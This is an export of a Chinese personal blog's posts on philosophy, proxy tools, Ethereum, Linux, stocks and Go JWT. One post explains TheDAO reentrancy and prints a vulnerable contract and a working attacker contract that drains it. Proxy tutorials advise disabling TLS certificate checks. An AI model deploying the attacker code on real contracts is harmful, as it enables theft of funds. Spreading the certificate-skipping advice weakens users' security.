那么对于个人而言，他存在自由意志吗。他存在，因为在问先知之前，他的未来是不确定的，那么就有一有点吊诡的问题。（有人害怕知道自己的未来会导致没有希望，但又渴望知道未来，所以他问先知，我要问我的未来吗，而当你去问的时候，你的未来已经被先知确认了，他已经知道你会在什么时候问，而你的生活依然是无限可能性，进一步说，先知早已知道你会来问他这个问题）。这就是先知的作用，磨平随即量，但你的未来依然由你决定（而贸然问先知你会怎么样，往往不会有好结果，只有你义无反顾的时候，你坚信先知的话不会影响你，才可能会有好结果） 那么既然说到了先知，我们就好好谈一下这篇文章的另一主题，形而上学。 什么是形而上学？有这么一个故事：有一个叫凯恩的人，他在一个咖啡馆里喝咖啡，真在他欣赏咖啡杯的时候，瞥见了对面新开的一间图书馆，然后他起身，打算去图书馆逛逛，他在书柜间闲逛时，看到了一半叫 凯恩录 的书，他打开看，里面从一个孩子出生开始，到被起名字，书的内容有一个奇怪的特点，所有的事情都是用现在进行时写的，随后他翻倒小学的故事，猛的震惊了他，所有的事都是他小学发生的，然后他继续看，看到他在咖啡馆，他到图书馆，他看到了这本书，他震惊。然后他接着往下看，看到38岁的时候，书上只剩最后一页了，他死在飞机上（最后即使万般小心，但书上说的事情都发生了）。 而在黑客帝国中，先知就是所有人的书。关于形而上学，有一个有意思的问题。矩阵中的人是被先知控制的吗。这是很有意思的，因为答案不是。形而上学并不控制人，如凯恩录 里面，一切都是现在进行时，先知只是知道会发生什么，但并不起决定作用，这么说，先知看透了你，他知道你这个程序，在矩阵这个环境中接下来会发生什么，形而上学也同样不控制你，但是你的结果依然是确定的，也就是自由意志存在（你还是你），但没用。 你（我）是谁？为什么你还是你，但是没用。因为你不知道你是谁，跟具体而言，你认为你是个“什么”,以至于蒙蔽了你，使得你以为你知道你是谁，实际上你不知道.我们还是请出先知来看看这个问题。你是谁？本质上先知有两个答案（你有自我意识，你没有自我意识），如果你没有自我意识，那么你就是矩阵，你是这里面的一个程序，那么这个问题就是。就程序而言你是什么？那答案就是你在这个程序里面是什么.（所以自我意识似乎是一种天赋,一种你在程序里而自知在程序里的天赋.这似乎不可能，就好像鱼儿不知道有空气一样的，纯粹在程序之中的人不知道程序，黑客帝国里面还是保留着 希安这一概念，男主是被唤醒的）。简单而言，先知会说你是个工人，是个学生，是谁的男朋友，是会的女朋友，是谁的儿子，是谁的父亲，但这一切，在本质上说，你是矩阵的一部分。 那么另外一种情况也就是你是救世主，关于救世主是什么，其实救世主是（不是矩阵，也就是什么都不是）。 有一个有意思的点在于 希安的人虽然不再矩阵里，但她们也不是救世主，因为他们是 希安。 另外，在第一季中，男主问先知：我是救世主吗？ 先知说不是。 如果不钻设计的空子，无论谁问先知是不是救世主，先知只能说不是，因为救世主不再先知的理解范围（先知的边界是矩阵），所以先知这时候就像是那条水里的鱼，不知道救世主是什么。 未完待续[预告： 老先生是什么吗，我们知道老先生是矩阵的上层，但是，老先生不一定就是最上层（这是缸中之脑的故事，以及有另外一个小说 –《13层空间》是讲述关于现实的上层）]","categories":[{"name":"哲学","slug":"哲学","permalink":"https://bighu630.github.io/categories/%E5%93%B2%E5%AD%A6/"},{"name":"形而上学","slug":"哲学/形而上学","permalink":"https://bighu630.github.io/categories/%E5%93%B2%E5%AD%A6/%E5%BD%A2%E8%80%8C%E4%B8%8A%E5%AD%A6/"}],"tags":[{"name":"形而上学","slug":"形而上学","permalink":"https://bighu630.github.io/tags/%E5%BD%A2%E8%80%8C%E4%B8%8A%E5%AD%A6/"},{"name":"黑客帝国","slug":"黑客帝国","permalink":"https://bighu630.github.io/tags/%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD/"}],"author":"ivhu"},{"title":"拉康精神分析与伦理","slug":"拉康精神分析与伦理","date":"2024-09-02T12:12:16.000Z","updated":"2026-02-27T03:14:28.901Z","comments":true,"path":"2024/09/02/拉康精神分析与伦理/","permalink":"https://bighu630.github.io/2024/09/02/%E6%8B%89%E5%BA%B7%E7%B2%BE%E7%A5%9E%E5%88%86%E6%9E%90%E4%B8%8E%E4%BC%A6%E7%90%86/","excerpt":"","text":"文章探讨了拉康精神分析中的两个核心概念——自我与大他者的关系。自我在与大他者的分离和互动中逐渐显现，但这种显现也是一种消失。最初，大他者多表现为母亲，自我与其处于融合状态，随后随着父亲的出现，孩子意识到大他者的分离性，进而认识到自我与大他者的独立性。然而，这种独立感只是暂时的，最终自我会被更大的社会大他者所替代。文章还探讨了不同状态下自我与他者的关系，包括完全依赖他者、与他者分离、以及半分离状态，并暗示每个人都处在某种程度的精神病态中。 缘起于我在b站上看的这么一个视频 https://www.bilibili.com/video/BV1zF4m1u7xH 视频我大体能理解，不过需要记一下，看看我理解了多少 在拉康的精神分析中，有两个重要的角色。 自我 大他者 注意这里的自我并不是具体的自我，是一种抽象的自我，这个自我在与大他者的分离中才逐步显现出来。但的一显现实际上是一种消失（我的理解）。自我的起源在于对大他者的反抗，在这个过程中，人自然而然的认为存在一个自我（这是反抗的源头），而后意识到自我与这个大他者的交融关系（这两是同时的）。随后展开自我与大他者的拉锯战 首先需要明白一点，这个大他者在开始时是母亲。在孩童时代自我与母亲是一种绝对的融合关系，我们对母亲的反抗不是拒绝，而是抱头大哭。可以这样想象，一个孩子犯错了（比如尿床了，有时候母亲会脾气不好），母亲如果打孩子，孩子不会跑，他会往母亲那里靠。这个时候孩子有自我吗。有，越打他越靠。这个时候表现为自我与大他者的同一。注意这里的大他者几乎都是母亲。随着年龄的不断增长，父亲这个角色逐渐浮现到孩子的视野里面（值得注意的是，及时父亲一直陪伴这孩子的成长，孩子也不会马上意识到父亲的存在，实际上更多时候父亲只是个npc），当孩子意识到父亲的存在是（一般是父亲，因为父亲是一个主线npc,其他人暂时还只是支线npc）从而意识到大他者的不完整性，（大他者的分离），从而逐渐意识到自我与大他者的分离，进一步到反抗大他者。从而进入到一种（父亲崇拜的年龄中）在这个过程中，那个他者之下的自我崇拜父亲这种（独立）的自我，当然这一崇拜并没有让自我意识到自我，而是让自我意识到他者的可分离 更进一步自我在崇拜中醒悟（这一醒悟来自于社会），这一醒悟让自我意识到自我，即自我与大他者的可分离，（这里插一嘴，似乎我已经忘了最初的自我是什么了）。当然这一可分离是一种误解，实际上是对社会环境这一更大的他者所替代，但这一幻觉对之后的分离有关键作用。自我在社会这个抽象的大他者中，而自以为是自我，这一他者的蒙蔽性在与，他不存在具体的某个人，自我就像是在空气中一样。 说完自我与他者，我们来看看精神分析如何看待自我他者问题。 首先有一个很有意思的结论：每个人都是精神病，无论你处在 自我与他者 的什么关系中。 自我在他者之中自我在他者之中从上面的分析可以看出这是一种这是一种婴儿的表现（或者巨婴），在这种情况中，自我全然依赖他者，而这种依赖不是说让做什么就做什么，而是那种说往东走，就一直走，雷打不动。 自我与他者的分离可以想象一下这样一种情况，你不在乎家人对你的要求，你不在乎社会对你的要求（你是自我，而不依靠他者）。你会迷茫，你会以为你想要的不过是你对他者的依赖，你会拒绝这种依赖，像马尔库塞的大拒绝那样拒绝他者。在这你只能拒绝，像一个悲剧英雄一样，但你拒绝悲剧英雄。他者无时无刻的入侵。你想反抗。 自我与他者的半分离状态这里的自我，渴望与他者的分离，想要找到分离的路线，试图去制造分离。典型的就是sm.试图生产出与他者分离的自我来找到分离的路径 伦理： 未完待续","categories":[{"name":"哲学","slug":"哲学","permalink":"https://bighu630.github.io/categories/%E5%93%B2%E5%AD%A6/"},{"name":"心理学","slug":"哲学/心理学","permalink":"https://bighu630.github.io/categories/%E5%93%B2%E5%AD%A6/%E5%BF%83%E7%90%86%E5%AD%A6/"}],"tags":[{"name":"拉康","slug":"拉康","permalink":"https://bighu630.github.io/tags/%E6%8B%89%E5%BA%B7/"},{"name":"精神分析","slug":"精神分析","permalink":"https://bighu630.github.io/tags/%E7%B2%BE%E7%A5%9E%E5%88%86%E6%9E%90/"},{"name":"伦理","slug":"伦理","permalink":"https://bighu630.github.io/tags/%E4%BC%A6%E7%90%86/"}],"author":"ivhu"},{"title":"安卓Surfboard使用教程","slug":"安卓Surfboard使用教程","date":"2024-09-02T11:50:20.000Z","updated":"2026-02-27T03:14:28.900Z","comments":true,"path":"2024/09/02/安卓Surfboard使用教程/","permalink":"https://bighu630.github.io/2024/09/02/%E5%AE%89%E5%8D%93Surfboard%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/","excerpt":"","text":"本文提供了在安卓设备上使用 Surfboard 的简单教程，涵盖了从安装、添加连接&#x2F;订阅到启动和测试的步骤。指南还包括如何使用分流功能让特定应用通过 VPN，以及修复连接问题的解决方法，如启用“绕过 TLS 验证”选项。该教程旨在帮助用户轻松解决安卓设备上的大部分问题。 由于很多小伙伴不知道安卓上Surfboard的使用，这里出一篇教程，旨在用最简单的步骤解决安卓机上的大部分问题 安装安装建议去google Play上安装 长这个样子 添加连接&#x2F;订阅一般情况下你会拿到节点的连接或者订阅：（像是一个网址之类的） 在配置这个选项卡里面，点击右下角的加号，选择最下面这个（从url导入） 贴入上面的url，点击导入就可以 开始在仪表盘页面，点击右下角的启动图标就可以（强烈建议出站模式选规则，可以避免国内网站也走翻墙服务） 测试（看是否可用）点到“代理” 选项卡里面，点右下角的测速图标就可以看是否连接成功 如果测速显示失败： 方法1：多测试几次（一般2-3次）因为刚连上可能会不稳定 方法2：去仪表板重启一下（点两下左下角的启动图标）然后重复方法1 进阶使用在工具中选择分流设置，仅让需要翻墙的软件使用vpn 问题修复如果一直测试不可用，建议进行如下操作（没什么影响，可用的也可以这么操作一下） 1：点右上角的三个点进入设置页面 2：点击覆盖选项 3：开启“绕过tls验证”","categories":[{"name":"教程","slug":"教程","permalink":"https://bighu630.github.io/categories/%E6%95%99%E7%A8%8B/"},{"name":"科学上网","slug":"教程/科学上网","permalink":"https://bighu630.github.io/categories/%E6%95%99%E7%A8%8B/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"}],"tags":[{"name":"教程","slug":"教程","permalink":"https://bighu630.github.io/tags/%E6%95%99%E7%A8%8B/"},{"name":"科学上网","slug":"科学上网","permalink":"https://bighu630.github.io/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"}],"author":"ivhu"},{"title":"MPT系列1","slug":"MPT系列1","date":"2024-09-02T06:05:14.000Z","updated":"2026-02-27T03:14:28.899Z","comments":true,"path":"2024/09/02/MPT系列1/","permalink":"https://bighu630.github.io/2024/09/02/MPT%E7%B3%BB%E5%88%971/","excerpt":"","text":"本博客探讨了以太坊为何使用MPT树及其在世界状态中的恢复机制，并解释了合约数据删除对MPT树负担的影响，强调了MPT树如何通过更新与回滚机制保障以太坊的状态管理。 为什么以太坊要用MPT数1,mpt树优于hash表，在区块连网络中，需要确认世界状态相同 ，hash表需要校验所有的hash 2.使用序列表会导致插入过程麻烦，插入一条数据，整个链路都要更新 MPT树是如何恢复的？（世界状态中的mpt树)mpt树的恢复与mpt树的更新是有关系的，在以太坊的生命周期中，世界状态的mpt树是根据更新的方式来改变状态的，具体而言，无论是对树做增删改，最后在数据库中都是插入一个新的key,然后根据这个新的key去更新路径上所有的key(更新的过程也是新建key然后插入进去，老key不会丢失) 根据节点的key-v我们可以知道，树的构建是由下而上的，因为父节点在存储是依赖前一节点的hash,当然分支节点中是在各个分支中写入hash,所以分支节点中包含大量的hash。那么当整个实际状态更新时: 例如node3发生了改变，并不会改变node3此刻对应的key-v ，而是会新建一个node,然后更新node2,node1,使得整个世界状态指向新产生的node3. 那么这样操作之后，当我们需要回滚时，我们只需要知道在需要回滚的位置的根状态hash,那么整个世界状态就可以根据这个过去的roothash,找回历史装状态，对于上面的例子而言，老的roothash最后会引导你找到老的node3 你将拿到node3被修改之前的状态。 这也是为什么 世界状态可以根据roothash恢复。 合约中删除数据可以减轻合约MPT树的负担吗？那么回味一下，世界状态能根据roothash恢复的关键是每一次世界状态的更新，以太坊都会把新状态落盘到数据库里面去. 那么对于合约的mpt树，实际上是不影响的，也就是如果我们把合约中的数据进行删除的确会减少mpt树的负担，因为删除的过程实际上会减少mpt树的树枝，并且改变了mpt树的结构。 但是删除合约中的数据并不会减轻以太坊的存储容量，合约中的所有数据都是一直保存的，删除只是在更新之后mpt数不指向被删除的数据. 可以参考一下这里对mpt树的删除操作：https://learnblockchain.cn/article/319 树的结构确实会变简化。","categories":[{"name":"区块链","slug":"区块链","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"以太坊","slug":"区块链/以太坊","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"}],"tags":[{"name":"MPT","slug":"MPT","permalink":"https://bighu630.github.io/tags/MPT/"},{"name":"以太坊","slug":"以太坊","permalink":"https://bighu630.github.io/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"}],"author":"ivhu"},{"title":"windows使用nekobox翻墙","slug":"how-to-use-nekobox-in-windows","date":"2024-09-02T02:39:47.000Z","updated":"2026-02-27T03:14:28.899Z","comments":true,"path":"2024/09/02/how-to-use-nekobox-in-windows/","permalink":"https://bighu630.github.io/2024/09/02/how-to-use-nekobox-in-windows/","excerpt":"","text":"这篇博客提供了如何在国内环境中安装和使用 Nekobox 客户端的详细指南。步骤包括：安装：提供了一个下载链接并指导如何解压和找到软件本体。使用：描述了如何设置以优化网络速度，包括选择绕过局域网和大陆的选项。翻墙链接导入：讲解了如何导入翻墙链接并启动。开启系统代理：指示如何启用系统代理并避免选择错误的模式。解决无法上网的问题：提供了针对无法上网的故障排除步骤，包括调整证书检查设置。整体来说，博客旨在帮助用户在国内网络环境下顺利安装和配置 Nekobox，以实现网络翻墙。 安装由于github国内可能访问不到，这里我把客户端要用的软件下载下来了: https://ww0.lanzouq.com/ifg4V270qwib 下载之后是一个zip压缩包，将压缩包解压后就是软件本体 软件本体叫nekobox,在文件夹里面找到它，双击打开（你可能会找到两个，其中一个是图片，如果你碰巧打开了图片，不用管它，去找另外一个） 使用打开后长这个样子 在使用前我们先进行一点设置（这样可以加速网速） 打开首选项里面的路由设置 在简易路由中 预设里面 选择“绕过局域网和大陆 然后点确定 回到最开始的地方，将翻墙链接导入进来 简单的方法：拿到我给出来的 以trojan&#x2F;vmess&#x2F;ss 这些开头的链接 在我鼠标所在的位置右键，选择从剪贴板导入（注意你要先复制） 这时候会在这里新增一条记录 右键这条记录 -&gt; 启动 开启系统代理启动之后你可能还不能用，这时候就需要开启系统代理 把这里勾上，注意一定不要勾上面的 Tun模式 解决无法上网如果还是有问题，可能可以试试下面的操作 双击有问题的记录（不要问我什么是记录，你启动的时候右键的那个），这会打开他的编辑页面 找到这里的不检查证书服务器，把这里勾上 然后点确认，再次启动试试 如果还有问题，那就在看啦。","categories":[{"name":"教程","slug":"教程","permalink":"https://bighu630.github.io/categories/%E6%95%99%E7%A8%8B/"},{"name":"科学上网","slug":"教程/科学上网","permalink":"https://bighu630.github.io/categories/%E6%95%99%E7%A8%8B/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"}],"tags":[{"name":"教程","slug":"教程","permalink":"https://bighu630.github.io/tags/%E6%95%99%E7%A8%8B/"},{"name":"科学上网","slug":"科学上网","permalink":"https://bighu630.github.io/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"}],"author":"ivhu"},{"title":"tho dao 合约漏洞","slug":"tho-dao-backdoor","date":"2024-07-30T05:43:23.000Z","updated":"2026-02-27T03:14:28.899Z","comments":true,"path":"2024/07/30/tho-dao-backdoor/","permalink":"https://bighu630.github.io/2024/07/30/tho-dao-backdoor/","excerpt":"","text":"这篇博客分析了TheDAO漏洞的机制，阐明了如何利用Solidity合约的特性进行攻击，具体展示了黑客合约如何通过重入攻击提取TheDAO合约中存储的以太坊，强调了在合约中处理资金转账和状态更新时需要遵循的安全原则。 什么是 TheDao 漏洞？简单来讲，thedao 漏洞允许黑客将 thedao 合约中储存的 eth 全部取走。 那么什么是合约之中的 eth 呢？ solidity 允许合约定义 payable 方法来接受 eth. 当用户调用带有 payable 关键字的合约方法时，如果msg.value不为 0,则将msg.value转移到合约账下。 由于 thedao 是一个面对所有人的合约，而他的业务逻辑也需要用户将 eth 转移到他的合约里面。 那么正常情况下 thedao 合约中有大量的 eth,来自于不同人的转账，一般而言合约会使用一个 mapping 来记录每个地址有多要 eth 在这里面。 solidity 特性如果我们向一个合约转账，这里的转账不是使用合约调用的方式，而是像普通转账一样，calldata 为空。 这时合约会自动调用 receive 方法（如果有的话），这将允许合约在收到转账后进行一些操作。 什么是先转账后记账在合约中我们可以使用 transfer,send 等方法将合约中一定数量的 eth 转移到对应的账户中，当然这里的转账对象也可以是另一个合约。 而记账的意思是，由于我们所有的 eth 都是放合约里面，没有区分那个 eth 是谁的，具体的记录一般在合约中用 mapping 记录，那么在合约中，每次我们进行转账时，都应该修改我们维护的账本（也就是那个 mapping）。先转账后记账的意思就是，先使用 transfor,send,call 等方法转账，而后更新 mapping 中的数据。在合约中表现为转账的操作在修改 mapping 的操作前面。 eg： (bool sent, ) = msg.sender.call{value: bal}(&quot;&quot;); // 先转账 require(sent, &quot;Failed to withdraw sender&#39;s balance&quot;); // Update user&#39;s balance. balances[msg.sender] = balances[msg.sender] - bal; // 后修改mapping中的数据 那么回到 solidity 的特性，在转账时，接受者合约可以定义recevie方法，在转账发生时进行相关操作。 漏洞的利用 当我们调用 theDao 中转账函数时，合约会向msg.sender转账. msg.sender是黑客的合约，当 theDao 向黑客的合约转账时，会调用黑客合约中的 recevie 方法. 由于 evm 是单线程的，所以后面修改 mapping 的操作还不会进行，而黑客的 recevie 方法则再次调用 thedao 中的转账合约. 由于 thedao 合约还没有修改账本，所以 thedao 合约还是认为黑客合约还可以提款，而当进行到提款操作时又会进入到黑客合约的recevie方法. 如此循环，直到达到黑客recevie中设置的阈值。 案例合约： // SPDX-License-Identifier: MIT pragma solidity ^0.8.10; contract Dao { mapping(address =&gt; uint256) public balances; function deposit() public payable { require(msg.value &gt;= 1 ether, &quot;Deposits must be no less than 1 Ether&quot;); balances[msg.sender] += msg.value; } function withdraw() public { // Check user&#39;s balance require( balances[msg.sender] &gt;= 1 ether, &quot;Insufficient funds. Cannot withdraw&quot; ); uint256 bal = balances[msg.sender]; // Withdraw user&#39;s balance // payable(msg.sender).transfer(bal); // transfer只能向eoa发送交易 (bool sent, ) = msg.sender.call{value: bal}(&quot;&quot;); // call eoa和合约都可以发送 require(sent, &quot;Failed to withdraw sender&#39;s balance&quot;); // Update user&#39;s balance. balances[msg.sender] = balances[msg.sender] - bal; require(balances[msg.sender]&gt;=0,&quot;balances &lt; 0&quot;); } function daoBalance() public view returns (uint256) { return address(this).balance; } } 黑客合约： // SPDX-License-Identifier: MIT pragma solidity ^0.8.10; interface IDao { function withdraw() external ; function deposit()external payable; } contract Hacker{ IDao dao; address payable hacker; constructor(address _dao){ dao = IDao(_dao); hacker = payable(msg.sender); } function attack() public payable { // Seed the Dao with at least 1 Ether. require(msg.value &gt;= 1 ether, &quot;Need at least 1 ether to commence attack.&quot;); dao.deposit{value: msg.value}(); // Withdraw from Dao. dao.withdraw(); } fallback() external payable{ if(address(dao).balance &gt;= 1 ether){ dao.withdraw(); } } receive() external payable { if(address(dao).balance &gt;= 1 ether){ dao.withdraw(); } } function getBalance()public view returns (uint){ return address(this).balance; } function getAllETH()public { hacker.transfer(address(this).balance); } }","categories":[{"name":"区块链","slug":"区块链","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"以太坊","slug":"区块链/以太坊","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://bighu630.github.io/tags/solidity/"},{"name":"合约安全","slug":"合约安全","permalink":"https://bighu630.github.io/tags/%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/"}],"author":"ivhu"},{"title":"Linux通用grub急救","slug":"Linux通用grub急救","date":"2024-07-03T11:41:39.000Z","updated":"2026-02-27T03:14:28.899Z","comments":true,"path":"2024/07/03/Linux通用grub急救/","permalink":"https://bighu630.github.io/2024/07/03/Linux%E9%80%9A%E7%94%A8grub%E6%80%A5%E6%95%91/","excerpt":"","text":"在这篇博客中，作者介绍了在折腾Linux的GRUB引导时常遇到的问题，并提出了解决方案，特别是当GRUB因分区表修改或Windows升级而出现问题时，如何修复GRUB引导。通过分享Windows与Linux共存环境下可能出现的分区表错位问题，作者提供了一个简单有效的解决思路：重新安装GRUB并使用grub-mkconfig生成新的GRUB配置。同时，文章还强调了使用Arch启动盘和手动挂载分区来解决问题的过程。 对于刚接触linux的小白，我们有无数种可能去把我们的grub引导给折腾坏，可能只是因为默认的grub太丑，或者其他手欠的原因。总之我们都是按照网上的教程（加一点点我们自己的理解）然后grub就给我一个 “&gt;” 了。 把grub弄坏，你是故意的还是不小心的？ 要是不小心的话，有可能你的grub引导还在，只是他找不到硬盘了。 通常来说大概率（系统会帮）我们把grub放在硬盘分区的前面，这样即使我们后面手欠向改一改分区，也不会影响到前面的分区。但是也有一种情况，我们使用的是双系统，虽然我也不用windows，但是偶尔进去看到它要升级，然后我grub就挂了。 实际上是这么回事儿，windows,和linux安装在一个硬盘上，windows分区在前面。windos做大版本升级的时候，有可能他会改分区表（我已经踩两次了，一次win10升win11,一次win11升级，就在我写这个博客的时候）。如果是这样，你有可能通过我之前写的一篇博客恢复https://www.cnblogs.com/bighuyspa/p/15416476.html 使用上面方法修复grub的原理是，因为硬盘分区错位导致的grub分区找不到。 上面的教程是我用kali的时候的，我不确定是否每次都能这样干，反正最近的这次事故我没用这种方法解决，可能是我用的arch是我自己设置的grub,并且arch需要使用efi，结果我efi分区挂不上去。 下面是我理解的，几乎100%解决grub引导问题。 思路其实很简单，我们只需要重新安装一下grub,然后用grub-mkconfig重新生成一下grub配置就可以。 第一步：弄个arch的启动盘（家中常备arch启动盘，这很正常吧。） 第二步：然后去dev下面找找你系统在那个分区上，具体你可以百度搜索linux查看硬盘分区详情，然后看看大小，这个就看你跟你linux的感情了，能不能一次找到。然后随便找个文件夹给他挂上去。 挂上去之后，你可以看看里面的boot&#x2F; 和 boot&#x2F;grub 下面有没有很多东西，当然可能还要把你的efi分区挂载到这个boot文件夹里面。","categories":[{"name":"计算机","slug":"计算机","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"},{"name":"linux","slug":"计算机/linux","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://bighu630.github.io/tags/linux/"},{"name":"grub","slug":"grub","permalink":"https://bighu630.github.io/tags/grub/"}],"author":"ivhu"},{"title":"A股-初见","slug":"A股-初见","date":"2024-01-26T12:45:36.000Z","updated":"2026-02-27T03:14:28.899Z","comments":true,"path":"2024/01/26/A股-初见/","permalink":"https://bighu630.github.io/2024/01/26/A%E8%82%A1-%E5%88%9D%E8%A7%81/","excerpt":"","text":"上手就不知道怎么写，感觉是个好事，说明我有想表达而又不需要开个好头的东西，有个开头似乎就是在铺垫一些基础知识，没法开头实际上也恰恰说明我不懂基础知识，but，不懂-写起来才爽。 关于A股，一直以来都是饱受争议的，实际上也没什么争议，来了就别想走。巴菲特来了也得留下裤衩。说起来很搞笑。但是，A股他依然存在，广大股民也依然存在。在一个显然没有希望的地方，却依然有不少人往里面跳。这合理吗？ 这不合理，当然除了不合理的地方，其他地方都很合理。他不合理在于–这是一个不可能赚钱的市场。 那么其余的地方为什么合理？ 我觉得自始至终有一个关键问题，股市它不是一个零和游戏，来这个市场并不是为了去抢别人手里钱。股民把钱投入到股市里面不是为了去做一些投机的竞争，而是说，我把这个钱投入到某个公司，我算是这个公司的股东，我希望这个公司能够生产出新的社会价值，即这个公司需要实现内部的增至，简单来说：这个公司要赚钱，让公司的价值越来越大。这个才是正常的股市，及股市为股民提供投资的方式，让公司拥有将公司做的更大的资金，而股民的股票也随着公司的增值而增值，这是一个非必然的双赢（存在公司亏钱的可能），但是，在A股，这是一个必输的游戏。简单来说，国内很少有希望把公司做大的公司高管。这里我可以直接怀疑他们的能力不行，国内没有多少能把一个公司经营的较为稳定的增值的人。不过这里的能力不行是一个相对的说法，在这样一个土壤里，能力“行”得付出得更多。目前国内没有多少打算做大的公司。金典的钟雪糕经营模式在国内屡见不鲜，这已经算是名牌打了，我认为像这样的公司我可以肆无忌惮的耻笑。 当然，并不是说中国所有的企业都是这样的，也有不少年轻人，心怀着梦想，努力在一线工作，最后混了个灰头土脸。当然，这是一个土壤问题，这里不打算展开。而这一问题造成的后果是，中国资本市场，不是一个增值市场，资本在市场中不能有效的形成增值，而股市变成了一个资本再分配的市场，那么在这样的一个背景下，A股形成了一道独特的风景线，资本不为增值，而是通过股市将资本变现。这也就形成了一个笑话，上市公司不是来上市，他们是来卖公司的，一上市就开抛。上市之前都是一股独大，公司核心成员拥有超过40%(部分可达80%）的股份，上市不为筹资建设公司，形成资本增值，主要是为了抛售股票，迅速套现。当然，可能有部分创业者秉持着建设公司的梦想，当现实一次次啪啪啪的打脸的实施，他们也沉默的抛售手里的公司，说错了是股票。 由此可见，A股的上市公司，大部分像一堆巨婴一样，遇到点挫折就开始抛售股票。当然，如果是我我也抛，上市就抛。抛玩就跑。 当然这只是表像，A股的问题还有什么一股独大，注册制，畸形的市场竞争（注重短期收益，全tm是投机），四不像的独立董事会，极地的上市标准，以及最重要的人情事故。但是出于时间关系，我也不展开了。 总之一句话，A股，别来，你敢来我就敢抛，你敢接我就敢把公司卖给你 （擦汗），中国经济是一个复杂的东西，而这负责的市场逻辑，导致市场违背其理应的发展方向，即市场增值。中国这么大的市场体量，要实现增值实际上不是没有机会，这么大的一块蛋糕，很多外资都想挤进来，不过A股还是你A股，目前还有很多公司还没有抛售完 ，you can have a try.","categories":[{"name":"经济","slug":"经济","permalink":"https://bighu630.github.io/categories/%E7%BB%8F%E6%B5%8E/"}],"tags":[{"name":"A股","slug":"A股","permalink":"https://bighu630.github.io/tags/A%E8%82%A1/"}],"author":"ivhu"},{"title":"gin & jwt","slug":"gin-jwt","date":"2024-01-26T12:06:36.000Z","updated":"2026-02-27T03:14:28.899Z","comments":true,"path":"2024/01/26/gin-jwt/","permalink":"https://bighu630.github.io/2024/01/26/gin-jwt/","excerpt":"","text":"本文介绍了在Go语言的Gin框架中使用JWT（JSON Web Token）进行身份验证的方法。作者讲解了JWT的作用，包括在客户端与服务器之间传递身份信息和防止重放攻击。博客详细展示了如何通过Gin的中间件来实现JWT校验，确保请求的合法性和安全性。文章还强调了JWT的基本使用注意事项，如不要在JWT中包含敏感信息，以及在验证时应注意Token的有效性和过期时间。 作用JWT 的主要作用是方便客戶端與伺服器之間的身份驗證。 使用JWT 可以在不需要每次登入的情況下，在客戶端與伺服器之間安全地傳遞封裝身份信息。 它還可以用於許多其他用途，例如串接多個服務，並將數據在服務間安全地傳遞。 简单类说jwt作用在c&#x2F;s模型中的通信过程中，用于验证c端是否具有访问权限。 一般在jwt中包含一些基本信息，包括用户名，时间戳等。可以在一定承担上防止重放攻击。 注意：自jwt的内容部分，切勿包含任何如密码等敏感信息，因为jwt是使用明文传递的。 在jwt中需要双发线下协商一个所secret，在之后的请求中c端将使用这个secret最jwt做签名，服务端使用这个secret验证签名，签名的内容明文传输。在gin中使用jwt gin可以使用中间件的形式完成jwt校验// node config group nodeGroup := router.Group(methods.NodeTag, methods.JWTMiddleware()) initNodeConfigControllers(nodeGroup) 以上是在 NodeTag 这个请求组里面添加JWT校验，这样只作用与这一个请求组，也可以针对某个请求做校验或全部请求都做校验。 注意，一般将JWT的token放在请求头里面，不要放在请求体里面 JWT校验函数一般格式func JWTMiddleware() gin.HandlerFunc { return func(ctx *gin.Context) { user_token := ctx.GetHeader(&quot;Authorization&quot;) token, err := jwt.Parse(user_token, func(token *jwt.Token) (interface{}, error) { if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok { return nil, fmt.Errorf(&quot;Unexpected signing method: %v&quot;, token.Header[&quot;alg&quot;]) } return []byte(configuration.GetToken()), nil // 此处GetToken得到的就是双发协定好的secret }) if err != nil { log.Error(&quot;Token parsing error&quot;, &quot;err&quot;, err) ReturnErrorResp(ctx, http.StatusUnauthorized, PermissionError, err.Error()) ctx.Abort() return } // 验证解析后的令牌是否有效 if !token.Valid { log.Error(&quot;Invalid token&quot;) ReturnErrorResp(ctx, http.StatusUnauthorized, PermissionError, &quot;token is ill&quot;) ctx.Abort() return } else { // 从令牌中提取有效载荷 (claims) claims, ok := token.Claims.(jwt.MapClaims) if ok { if !claims.VerifyExpiresAt(time.Now().Unix(), true) { log.Error(&quot;jwt token timeout&quot;) ReturnErrorResp(ctx, http.StatusUnauthorized, PermissionError, &quot;token is ill&quot;) ctx.Abort() return } } else { log.Error(&quot;Invalid token claims&quot;) ReturnErrorResp(ctx, http.StatusUnauthorized, PermissionError, &quot;token is ill&quot;) ctx.Abort() return } } ctx.Next() } 